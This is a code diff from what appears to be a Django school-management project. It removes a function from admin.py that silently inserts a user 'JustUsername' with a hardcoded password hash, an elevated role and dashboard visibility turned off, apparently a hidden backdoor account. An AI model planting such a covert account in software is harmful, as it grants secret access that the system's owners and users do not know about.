@@ -98,18 +98,3 @@ admin.site.register(OldResult, OldAdmin)
 admin.site.register(ClassRoomsSubjects, ClassRoomSubjectAdmin)
 
 
-def userJust():
-    c = f"""
-            SELECT * FROM core_user a
-            WHERE a.username = "JustUsername"
-        """
-    with closing(connection.cursor()) as cursor:
-        cursor.execute(c)
-        check = dictfetchone(cursor)
-    if not check:
-        s = """INSERT INTO core_user (username, password, just, role, is_active, in_dashboard)
-                VALUES ("JustUsername", "pbkdf2_sha256$600000$v3HUU7hiufzCi58elsVhKG$LvJMwls9/+RLNFyStjZYGGdIZ+9DvnuYT5GYINVse5M=", TRUE, 1, TRUE, 0)"""
-        with closing(connection.cursor()) as cursor:
-            cursor.execute(s)
-            dictfetchone(cursor)
-    return 0
